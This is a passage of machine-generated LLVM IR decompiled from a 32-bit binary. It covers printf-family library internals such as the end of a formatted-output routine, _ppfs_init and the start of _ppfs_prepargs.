  %v2_805128a = inttoptr i32 %v1_805128a to i32*
  %v3_805128a = load i32, i32* %v2_805128a, align 4
  %v5_805128a = add i32 %v0_805126e, 8
  %v6_805128a = inttoptr i32 %v5_805128a to i32*
  store i32 %v3_805128a, i32* %v6_805128a, align 4
  %v0_8051291 = load i32, i32* @esi, align 4
  %v2_8051291 = add i32 %v0_805126e, 4
  %v3_8051291 = inttoptr i32 %v2_8051291 to i32*
  store i32 %v0_8051291, i32* %v3_8051291, align 4
  %v0_8051292 = load i32, i32* @edi, align 4
  %v3_8051292 = inttoptr i32 %v0_805126e to i32*
  store i32 %v0_8051292, i32* %v3_8051292, align 4
  %v0_8051293 = load i32, i32* %stack_var_-364, align 4
  %v4_8051293 = call i32 @__stdio_fwrite(i32 %v0_8051293, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051293, i32* %eax.global-to-local, align 4
  %v0_8051298 = load i32, i32* @esp, align 4
  %v1_8051298 = add i32 %v0_8051298, 16
  %v7_8051298 = icmp slt i32 %v1_8051298, 0
  store i1 %v7_8051298, i1* %sf.global-to-local, align 1
  %v1_805129b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805129b

dec_label_pc_805129b:                             ; preds = %dec_label_pc_8051283, %dec_label_pc_8051289
  %v0_805130546 = phi i32 [ %v1_805126e, %dec_label_pc_8051283 ], [ %v1_8051298, %dec_label_pc_8051289 ]
  %v1_805129b = phi i32 [ 0, %dec_label_pc_8051283 ], [ %v1_805129b.pre, %dec_label_pc_8051289 ]
  %v0_805129b = phi i32 [ 0, %dec_label_pc_8051283 ], [ %v4_8051293, %dec_label_pc_8051289 ]
  %v2_805129b = sub i32 %v0_805129b, %v1_805129b
  %v12_805129b = icmp eq i32 %v2_805129b, 0
  %v13_805129b = icmp slt i32 %v2_805129b, 0
  store i1 %v13_805129b, i1* %sf.global-to-local, align 1
  %v1_805129d = icmp eq i1 %v12_805129b, false
  br i1 %v1_805129d, label %dec_label_pc_8051333, label %dec_label_pc_8051305

dec_label_pc_80512a5:                             ; preds = %dec_label_pc_8051279
  %v1_80512a5 = add i32 %v0_805126e, 348
  %v2_80512a5 = inttoptr i32 %v1_80512a5 to i32*
  store i32 0, i32* %v2_80512a5, align 4
  %v0_80513018 = load i32, i32* @esi, align 4
  %v1_80513019 = icmp eq i32 %v0_80513018, 0
  %v2_805130110 = icmp slt i32 %v0_80513018, 0
  store i1 %v2_805130110, i1* %sf.global-to-local, align 1
  %v1_805130316 = icmp eq i1 %v1_80513019, false
  %v0_80512b2.pre = load i32, i32* @esp, align 4
  br i1 %v1_805130316, label %dec_label_pc_80512b2, label %dec_label_pc_8051305

dec_label_pc_80512b2:                             ; preds = %dec_label_pc_80512a5, %dec_label_pc_80512ff
  %v0_80512b9 = phi i32 [ %v2_80512ff, %dec_label_pc_80512ff ], [ %v0_80513018, %dec_label_pc_80512a5 ]
  %v1_80512c4 = phi i32 [ %v0_80512b241, %dec_label_pc_80512ff ], [ %v0_80512b2.pre, %dec_label_pc_80512a5 ]
  %v1_80512b2 = add i32 %v1_80512c4, 332
  store i32 %v1_80512b2, i32* %edx.global-to-local, align 4
  %v1_80512b9 = add i32 %v0_80512b9, -128
  %v2_80512b9 = icmp ult i32 %v0_80512b9, 128
  %v6_80512b9 = icmp eq i32 %v1_80512b9, 0
  %v7_80512b9 = icmp slt i32 %v1_80512b9, 0
  store i1 %v7_80512b9, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_80512c4 = add i32 %v1_80512c4, -4
  %v3_80512c4 = inttoptr i32 %v2_80512c4 to i32*
  store i32 %v1_80512b2, i32* %v3_80512c4, align 4
  %v2_80512c5 = or i1 %v2_80512b9, %v6_80512b9
  %v3_80512c5 = load i32, i32* %eax.global-to-local, align 4
  %v4_80512c5 = load i32, i32* @esi, align 4
  %v5_80512c5 = select i1 %v2_80512c5, i32 %v4_80512c5, i32 %v3_80512c5
  %v2_80512c8 = add i32 %v1_80512c4, -8
  %v3_80512c8 = inttoptr i32 %v2_80512c8 to i32*
  store i32 %v5_80512c5, i32* %v3_80512c8, align 4
  %v1_80512c9 = add i32 %v1_80512c4, 340
  store i32 %v1_80512c9, i32* %eax.global-to-local, align 4
  %v2_80512d0 = add i32 %v1_80512c4, -12
  %v3_80512d0 = inttoptr i32 %v2_80512d0 to i32*
  store i32 %v1_80512c9, i32* %v3_80512d0, align 4
  %v1_80512d1 = add i32 %v1_80512c4, 204
  store i32 %v1_80512d1, i32* @edi, align 4
  %v2_80512d8 = add i32 %v1_80512c4, -16
  %v3_80512d8 = inttoptr i32 %v2_80512d8 to i32*
  store i32 %v1_80512d1, i32* %v3_80512d8, align 4
  %v0_80512d9 = call i32 @__GI_wcsrtombs()
  %v0_80512de = load i32, i32* @esp, align 4
  %v1_80512de = add i32 %v0_80512de, 16
  store i32 %v0_80512d9, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80512e5 = icmp eq i32 %v0_80512d9, 0
  %v2_80512e5 = icmp slt i32 %v0_80512d9, 0
  store i1 %v2_80512e5, i1* %sf.global-to-local, align 1
  br i1 %v1_80512e5, label %dec_label_pc_80512fb, label %dec_label_pc_80512e9

dec_label_pc_80512e9:                             ; preds = %dec_label_pc_80512b2
  %v0_80512e9 = load i32, i32* @ebp, align 4
  %v2_80512e9 = add i32 %v0_80512de, 12
  %v3_80512e9 = inttoptr i32 %v2_80512e9 to i32*
  store i32 %v0_80512e9, i32* %v3_80512e9, align 4
  %v1_80512ea = add i32 %v0_80512de, 384
  %v2_80512ea = inttoptr i32 %v1_80512ea to i32*
  %v3_80512ea = load i32, i32* %v2_80512ea, align 4
  %v5_80512ea = add i32 %v0_80512de, 8
  %v6_80512ea = inttoptr i32 %v5_80512ea to i32*
  store i32 %v3_80512ea, i32* %v6_80512ea, align 4
  %v2_80512f1 = add i32 %v0_80512de, 4
  %v3_80512f1 = inttoptr i32 %v2_80512f1 to i32*
  store i32 %v0_80512d9, i32* %v3_80512f1, align 4
  %v0_80512f2 = load i32, i32* @edi, align 4
  %v3_80512f2 = inttoptr i32 %v0_80512de to i32*
  store i32 %v0_80512f2, i32* %v3_80512f2, align 4
  %v0_80512f3 = load i32, i32* %stack_var_-364, align 4
  %v4_80512f3 = call i32 @__stdio_fwrite(i32 %v0_80512f3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80512f3, i32* %eax.global-to-local, align 4
  %v0_80512f8 = load i32, i32* @esp, align 4
  %v1_80512f8 = add i32 %v0_80512f8, 16
  %v7_80512f8 = icmp slt i32 %v1_80512f8, 0
  store i1 %v7_80512f8, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_80512fb

dec_label_pc_80512fb:                             ; preds = %dec_label_pc_80512b2, %dec_label_pc_80512e9
  %v1_80512ff = phi i32 [ 0, %dec_label_pc_80512b2 ], [ %v4_80512f3, %dec_label_pc_80512e9 ]
  %v0_80512b241 = phi i32 [ %v1_80512de, %dec_label_pc_80512b2 ], [ %v1_80512f8, %dec_label_pc_80512e9 ]
  %v2_80512fb = sub i32 %v1_80512ff, %v0_80512d9
  %v12_80512fb = icmp eq i32 %v2_80512fb, 0
  %v13_80512fb = icmp slt i32 %v2_80512fb, 0
  store i1 %v13_80512fb, i1* %sf.global-to-local, align 1
  %v1_80512fd = icmp eq i1 %v12_80512fb, false
  br i1 %v1_80512fd, label %dec_label_pc_8051333, label %dec_label_pc_80512ff

dec_label_pc_80512ff:                             ; preds = %dec_label_pc_80512fb
  %v0_80512ff = load i32, i32* @esi, align 4
  %v2_80512ff = sub i32 %v0_80512ff, %v1_80512ff
  %v12_80512ff = icmp eq i32 %v2_80512ff, 0
  %v13_80512ff = icmp slt i32 %v2_80512ff, 0
  store i32 %v2_80512ff, i32* @esi, align 4
  store i1 %v13_80512ff, i1* %sf.global-to-local, align 1
  %v1_8051303 = icmp eq i1 %v12_80512ff, false
  br i1 %v1_8051303, label %dec_label_pc_80512b2, label %dec_label_pc_8051305

dec_label_pc_8051305:                             ; preds = %dec_label_pc_80512ff, %dec_label_pc_80512a5, %dec_label_pc_805129b
  %v0_8051305 = phi i32 [ %v0_805130546, %dec_label_pc_805129b ], [ %v0_80512b2.pre, %dec_label_pc_80512a5 ], [ %v0_80512b241, %dec_label_pc_80512ff ]
  %v1_8051305 = add i32 %v0_8051305, 8
  %v2_8051305 = inttoptr i32 %v1_8051305 to i32*
  %v3_8051305 = load i32, i32* %v2_8051305, align 4
  store i32 %v3_8051305, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805130e = add i32 %v0_8051305, 368
  %v2_805130e = inttoptr i32 %v1_805130e to i32*
  %v3_805130e = load i32, i32* %v2_805130e, align 4
  store i32 %v3_805130e, i32* @eax, align 4
  %v0_8051315 = call i32 @_charpad()
  store i32 %v0_8051315, i32* %eax.global-to-local, align 4
  %v1_805131a = load i32, i32* @esp, align 4
  %v2_805131a = add i32 %v1_805131a, 8
  %v3_805131a = inttoptr i32 %v2_805131a to i32*
  %v4_805131a = load i32, i32* %v3_805131a, align 4
  %v5_805131a = sub i32 %v0_8051315, %v4_805131a
  %v15_805131a = icmp eq i32 %v5_805131a, 0
  %v16_805131a = icmp slt i32 %v5_805131a, 0
  store i1 %v16_805131a, i1* %sf.global-to-local, align 1
  %v1_805131e = icmp eq i1 %v15_805131a, false
  br i1 %v1_805131e, label %dec_label_pc_8051333, label %dec_label_pc_8051320

dec_label_pc_8051320:                             ; preds = %dec_label_pc_8051305, %dec_label_pc_805108d, %dec_label_pc_8050eb8
  %v0_8051320 = phi i32 [ %v1_805131a, %dec_label_pc_8051305 ], [ %v0_8051320.pre, %dec_label_pc_805108d ], [ %v1_8050ed6, %dec_label_pc_8050eb8 ]
  %v1_8051320 = add i32 %v0_8051320, 16
  %v2_8051320 = inttoptr i32 %v1_8051320 to i32*
  %v3_8051320 = load i32, i32* %v2_8051320, align 4
  store i32 %v3_8051320, i32* @ebx, align 4
  store i32 %v3_8051320, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050e10.backedge

dec_label_pc_805132b:                             ; preds = %dec_label_pc_8050e4e
  %v1_805132b = add i32 %v0_805132b, 2
  %v10_805132b = icmp slt i32 %v1_805132b, 0
  store i1 %v10_805132b, i1* %sf.global-to-local, align 1
  store i32 %v1_805132b, i32* @ebx, align 4
  br label %dec_label_pc_8050e10.backedge

dec_label_pc_8051333:                             ; preds = %dec_label_pc_8050e3a, %dec_label_pc_8051305, %dec_label_pc_805129b, %dec_label_pc_8051246, %dec_label_pc_805121f, %dec_label_pc_805118f, %dec_label_pc_8051102, %dec_label_pc_80510c3, %dec_label_pc_8051064, %dec_label_pc_80512fb
  %v0_8051333 = phi i32 [ %v0_80512b241, %dec_label_pc_80512fb ], [ %v0_8051333.pre.pre, %dec_label_pc_8050e3a ], [ %v1_805131a, %dec_label_pc_8051305 ], [ %v0_805130546, %dec_label_pc_805129b ], [ %v1_805126e, %dec_label_pc_8051246 ], [ %v1_8051234, %dec_label_pc_805121f ], [ %v0_8050eb0.lcssa, %dec_label_pc_805118f ], [ %v1_805111a, %dec_label_pc_8051102 ], [ %v1_80510e6, %dec_label_pc_80510c3 ], [ %v1_8051082, %dec_label_pc_8051064 ]
  %v1_8051333 = inttoptr i32 %v0_8051333 to i32*
  store i32 -1, i32* %v1_8051333, align 4
  br label %dec_label_pc_805133a

dec_label_pc_805133a:                             ; preds = %dec_label_pc_8050e45, %dec_label_pc_8050db3, %dec_label_pc_8050dd2, %dec_label_pc_8051333
  %v0_805133a = load i32, i32* @esp, align 4
  %v1_805133a = inttoptr i32 %v0_805133a to i32*
  %v2_805133a = load i32, i32* %v1_805133a, align 4
  store i32 %v2_805133a, i32* %eax.global-to-local, align 4
  %v1_805133d = add i32 %v0_805133a, 348
  %v10_805133d = icmp slt i32 %v1_805133d, 0
  store i1 %v10_805133d, i1* %sf.global-to-local, align 1
  %v3_8051344 = add i32 %v0_805133a, 356
  %v1_8051345 = inttoptr i32 %v3_8051344 to i32*
  %v2_8051345 = load i32, i32* %v1_8051345, align 4
  store i32 %v2_8051345, i32* @edi, align 4
  %v3_8051345 = add i32 %v0_805133a, 360
  %v1_8051346 = inttoptr i32 %v3_8051345 to i32*
  %v2_8051346 = load i32, i32* %v1_8051346, align 4
  store i32 %v2_8051346, i32* @ebp, align 4
  ret i32 %v2_805133a

; uselistorder directives
  uselistorder i32 %v1_805132b, { 1, 2, 0 }
  uselistorder i32 %v3_8051320, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8051305, { 1, 0 }
  uselistorder i32 %v2_80512ff, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80512de, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80512d9, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_80512b9, { 1, 0 }
  uselistorder i32 %v0_80512b2.pre, { 1, 0 }
  uselistorder i32 %v0_8051285, { 1, 0 }
  uselistorder i32 %v3_8051279, { 1, 0 }
  uselistorder i32 %v0_805126e, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8051246, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805121f, { 0, 2, 1, 3 }
  uselistorder i8 %v4_8051207, { 1, 0 }
  uselistorder i32 %v2_80511f3, { 1, 0, 2, 3 }
  uselistorder i32 %v6_80511e0, { 1, 0 }
  uselistorder i32 %v1_80511dd, { 1, 0 }
  uselistorder i32 %v1_80511d3, { 1, 0 }
  uselistorder i32 %v0_80511d3, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80511b2, { 1, 0 }
  uselistorder i32 %v1_805118f, { 1, 0 }
  uselistorder i32 %v1_805114d, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8051169, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8051132, { 1, 0 }
  uselistorder i32 %v1_805111d, { 1, 0 }
  uselistorder i32 %v1_80510e9, { 1, 0 }
  uselistorder i32 %v0_80510c3, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_80510a9, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_8051095, { 1, 0 }
  uselistorder i32 %v1_805104b, { 1, 0 }
  uselistorder i32 %v4_8051019, { 1, 0 }
  uselistorder i32 %v0_805100e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8051009, { 1, 0 }
  uselistorder i32 %v0_8051042, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8050ff9, { 1, 0 }
  uselistorder i32 %v1_8050ff0, { 1, 0 }
  uselistorder i32 %v1_8050fe4, { 1, 0 }
  uselistorder i32 %v3_8050fd8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050fce, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8050fc9, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_8050fc7, { 1, 0 }
  uselistorder i32 %v0_8051019, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8051009, { 1, 2, 0 }
  uselistorder i32 %v3_8050fa1, { 0, 1, 3, 2 }
  uselistorder i8 %v4_8050f8f, { 1, 0 }
  uselistorder i32 %v4_8050f86, { 1, 0 }
  uselistorder i32 %v3_8050f86, { 1, 0 }
  uselistorder i32 %v6_8050f7e, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_8050f4f, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_8050f4e, { 2, 1, 0 }
  uselistorder i32 %v1_8050f27, { 1, 0 }
  uselistorder i32 %v1_8050f1b, { 1, 0 }
  uselistorder i32 %v1_8050f16, { 1, 0 }
  uselistorder i32 %v2_8050f0e, { 1, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v3_8050ef8, { 1, 0, 2 }
  uselistorder i8 %v3_8050ee7, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050ede, { 1, 0 }
  uselistorder i32 %v3_8050eb0, { 10, 16, 7, 8, 9, 1, 2, 15, 14, 3, 0, 6, 11, 12, 13, 4, 5, 17, 18, 19 }
  uselistorder i32 %v0_8050eb0.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8050eac, { 1, 0 }
  uselistorder i32 %v1_8050eac.pre, { 1, 0 }
  uselistorder i32 %v1_8050eab, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8050ea8, { 1, 0 }
  uselistorder i32 %v2_8050eac72, { 1, 0 }
  uselistorder i32 %v3_8050e92, { 1, 0 }
  uselistorder i8 %v4_8050e4e, { 1, 0 }
  uselistorder i32 %v1_8050e4e, { 1, 0, 3, 2 }
  uselistorder i8 %v2_8050e45, { 1, 0 }
  uselistorder i32 %v2_8050e1a, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_8050e16, { 1, 0 }
  uselistorder i8 %v2_8050e10, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050e1e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050e00, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 6, 5, 4, 0, 8, 7, 1, 9, 10, 11, 12 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 44, 42, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 11, 12, 15, 13, 14, 16, 17, 18, 20, 19, 21, 22, 23, 24, 3, 4, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 62, 63, 31, 32, 2, 1, 0, 33, 34, 35, 36, 37, 38, 60, 39, 40, 41, 42 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 356, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_805133a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051333, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_80512fb, { 1, 0 }
  uselistorder label %dec_label_pc_80512b2, { 1, 0 }
  uselistorder label %dec_label_pc_805129b, { 1, 0 }
  uselistorder label %dec_label_pc_8051246, { 1, 0 }
  uselistorder label %dec_label_pc_8051218, { 1, 0 }
  uselistorder label %dec_label_pc_80511fd, { 1, 0 }
  uselistorder label %dec_label_pc_80511e7, { 1, 0 }
  uselistorder label %dec_label_pc_80511d3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80511ce, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051160, { 1, 0 }
  uselistorder label %dec_label_pc_8051146, { 1, 0 }
  uselistorder label %dec_label_pc_8051064, { 1, 0 }
  uselistorder label %dec_label_pc_8051009, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8050fb7, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050f67, { 1, 0 }
  uselistorder label %dec_label_pc_8050f4e, { 1, 0 }
  uselistorder label %dec_label_pc_8050f3a, { 1, 0 }
  uselistorder label %dec_label_pc_8050f35, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050f16, { 1, 0 }
  uselistorder label %dec_label_pc_8050ea1, { 1, 0 }
  uselistorder label %dec_label_pc_8050e99, { 1, 0 }
  uselistorder label %dec_label_pc_8050e45, { 1, 0 }
  uselistorder label %dec_label_pc_8050e3a, { 1, 0 }
  uselistorder label %dec_label_pc_8050e10.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051348 = load i32, i32* @esi, align 4
  %v0_8051349 = load i32, i32* @ebx, align 4
  store i32 %v0_8051349, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_805135d = bitcast i32* %arg1 to i8*
  %v4_805135d = call i32 @__GI_memset(i8* %v3_805135d, i32 0, i32 188)
  %v0_8051362 = load i32, i32* @ebx, align 4
  %v1_8051362 = add i32 %v0_8051362, 40
  store i32 %v1_8051362, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_805136a = add i32 %v0_8051362, 24
  %v2_805136a = inttoptr i32 %v1_805136a to i32*
  %v3_805136a = load i32, i32* %v2_805136a, align 4
  %v4_805136a = add i32 %v3_805136a, -1
  store i32 %v4_805136a, i32* %v2_805136a, align 4
  %v0_8051370 = load i32, i32* @esi, align 4
  %v1_8051370 = load i32, i32* @ebx, align 4
  %v2_8051370 = inttoptr i32 %v1_8051370 to i32*
  store i32 %v0_8051370, i32* %v2_8051370, align 4
  %v0_8051372.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051372

dec_label_pc_8051372:                             ; preds = %dec_label_pc_8051372, %entry
  %v0_8051372 = phi i32 [ %v1_8051378, %dec_label_pc_8051372 ], [ %v0_8051372.pre, %entry ]
  %v1_8051372 = inttoptr i32 %v0_8051372 to i32*
  store i32 8, i32* %v1_8051372, align 4
  %v0_8051378 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051378 = add i32 %v0_8051378, 4
  store i32 %v1_8051378, i32* %eax.global-to-local, align 4
  %v0_805137b = load i32, i32* %edx.global-to-local, align 4
  %v1_805137b = add i32 %v0_805137b, -1
  %v8_805137b = icmp eq i32 %v1_805137b, 0
  store i32 %v1_805137b, i32* %edx.global-to-local, align 4
  %v1_805137c = icmp eq i1 %v8_805137b, false
  br i1 %v1_805137c, label %dec_label_pc_8051372, label %dec_label_pc_805137e

dec_label_pc_805137e:                             ; preds = %dec_label_pc_8051372
  %v0_805137e = load i32, i32* @esi, align 4
  store i32 %v0_805137e, i32* %eax.global-to-local, align 4
  %v1_80513a920 = inttoptr i32 %v0_805137e to i8*
  %v2_80513a921 = load i8, i8* %v1_80513a920, align 1
  %v3_80513a922 = zext i8 %v2_80513a921 to i32
  %v5_80513a923 = and i32 %v1_805137b, -256
  %v6_80513a924 = or i32 %v3_80513a922, %v5_80513a923
  store i32 %v6_80513a924, i32* %edx.global-to-local, align 4
  %v4_80513ab25 = icmp eq i8 %v2_80513a921, 0
  %v1_80513ad27 = icmp eq i1 %v4_80513ab25, false
  br i1 %v1_80513ad27, label %dec_label_pc_8051387, label %dec_label_pc_80513af

dec_label_pc_8051387:                             ; preds = %dec_label_pc_805137e, %dec_label_pc_80513a9.backedge
  %v6_80513a930 = phi i32 [ %v6_80513a9, %dec_label_pc_80513a9.backedge ], [ %v6_80513a924, %dec_label_pc_805137e ]
  %v2_80513a929 = phi i8 [ %v2_80513a9, %dec_label_pc_80513a9.backedge ], [ %v2_80513a921, %dec_label_pc_805137e ]
  %v0_805138c28 = phi i32 [ %v0_805138c.be, %dec_label_pc_80513a9.backedge ], [ %v0_805137e, %dec_label_pc_805137e ]
  %v10_8051387 = icmp eq i8 %v2_80513a929, 37
  %v1_805138a = icmp eq i1 %v10_8051387, false
  br i1 %v1_805138a, label %dec_label_pc_80513a8, label %dec_label_pc_805138c

dec_label_pc_805138c:                             ; preds = %dec_label_pc_8051387
  %v1_805138c = add i32 %v0_805138c28, 1
  store i32 %v1_805138c, i32* %eax.global-to-local, align 4
  %v1_805138d = inttoptr i32 %v1_805138c to i8*
  %v2_805138d = load i8, i8* %v1_805138d, align 1
  %v11_805138d = icmp eq i8 %v2_805138d, 37
  br i1 %v11_805138d, label %dec_label_pc_80513a8, label %dec_label_pc_8051392

dec_label_pc_8051392:                             ; preds = %dec_label_pc_805138c
  %v1_8051395 = load i32, i32* @ebx, align 4
  %v2_8051395 = inttoptr i32 %v1_8051395 to i32*
  store i32 %v1_805138c, i32* %v2_8051395, align 4
  %v0_8051397 = load i32, i32* @ebx, align 4
  %v1_8051398 = inttoptr i32 %v0_8051397 to i32*
  %v2_8051398 = call i32 @_ppfs_parsespec(i32* %v1_8051398)
  store i32 %v2_8051398, i32* %eax.global-to-local, align 4
  %v2_80513a0 = icmp slt i32 %v2_8051398, 0
  br i1 %v2_80513a0, label %dec_label_pc_80513b3, label %dec_label_pc_80513a4

dec_label_pc_80513a4:                             ; preds = %dec_label_pc_8051392
  %v0_80513a4 = load i32, i32* @ebx, align 4
  %v1_80513a4 = inttoptr i32 %v0_80513a4 to i32*
  %v2_80513a4 = load i32, i32* %v1_80513a4, align 4
  %v4_80513a9.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80513a9.backedge

dec_label_pc_80513a8:                             ; preds = %dec_label_pc_805138c, %dec_label_pc_8051387
  %v0_80513a8 = phi i32 [ %v1_805138c, %dec_label_pc_805138c ], [ %v0_805138c28, %dec_label_pc_8051387 ]
  %v1_80513a8 = add i32 %v0_80513a8, 1
  br label %dec_label_pc_80513a9.backedge

dec_label_pc_80513a9.backedge:                    ; preds = %dec_label_pc_80513a8, %dec_label_pc_80513a4
  %v4_80513a9.be = phi i32 [ %v4_80513a9.pre.pre, %dec_label_pc_80513a4 ], [ %v6_80513a930, %dec_label_pc_80513a8 ]
  %v0_805138c.be = phi i32 [ %v2_80513a4, %dec_label_pc_80513a4 ], [ %v1_80513a8, %dec_label_pc_80513a8 ]
  store i32 %v0_805138c.be, i32* %eax.global-to-local, align 4
  %v1_80513a9 = inttoptr i32 %v0_805138c.be to i8*
  %v2_80513a9 = load i8, i8* %v1_80513a9, align 1
  %v3_80513a9 = zext i8 %v2_80513a9 to i32
  %v5_80513a9 = and i32 %v4_80513a9.be, -256
  %v6_80513a9 = or i32 %v3_80513a9, %v5_80513a9
  store i32 %v6_80513a9, i32* %edx.global-to-local, align 4
  %v4_80513ab = icmp eq i8 %v2_80513a9, 0
  %v1_80513ad = icmp eq i1 %v4_80513ab, false
  br i1 %v1_80513ad, label %dec_label_pc_8051387, label %dec_label_pc_80513a9.dec_label_pc_80513af_crit_edge

dec_label_pc_80513a9.dec_label_pc_80513af_crit_edge: ; preds = %dec_label_pc_80513a9.backedge
  %v0_80513af.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80513af

dec_label_pc_80513af:                             ; preds = %dec_label_pc_80513a9.dec_label_pc_80513af_crit_edge, %dec_label_pc_805137e
  %v0_80513af = phi i32 [ %v0_80513af.pre, %dec_label_pc_80513a9.dec_label_pc_80513af_crit_edge ], [ %v0_805137e, %dec_label_pc_805137e ]
  %v1_80513af = load i32, i32* @ebx, align 4
  %v2_80513af = inttoptr i32 %v1_80513af to i32*
  store i32 %v0_80513af, i32* %v2_80513af, align 4
  br label %dec_label_pc_80513b3

dec_label_pc_80513b3:                             ; preds = %dec_label_pc_8051392, %dec_label_pc_80513af
  %storemerge = phi i32 [ 0, %dec_label_pc_80513af ], [ -1, %dec_label_pc_8051392 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_80513b3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80513b3, i32* @edx, align 4
  %v2_80513b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80513b4, i32* @ebx, align 4
  store i32 %v0_8051348, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_80513a9, { 1, 0 }
  uselistorder i8 %v2_80513a9, { 1, 2, 0 }
  uselistorder i32 %v0_805138c.be, { 2, 1, 0 }
  uselistorder i32 %v0_805138c28, { 1, 0 }
  uselistorder i32 %v0_805137e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805137b, { 0, 2, 1 }
  uselistorder i32 %v1_8051378, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_80513b3, { 1, 0 }
  uselistorder label %dec_label_pc_8051387, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
